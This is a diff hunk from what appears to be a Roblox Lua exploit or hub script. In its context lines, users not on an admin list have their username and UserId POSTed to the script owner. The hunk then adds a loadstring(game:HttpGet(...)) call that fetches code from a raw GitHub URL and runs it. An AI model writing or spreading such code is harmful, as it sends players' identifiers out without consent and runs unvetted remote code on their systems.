@@ -78,4 +78,6 @@ if not table.find(admin, plr.UserId) then
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
     print("Username & UserId has been sended to owner.")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jerka2009/Hubs/main/AdminCheck"))()
+    print("Creator detect is enabled!")
 end
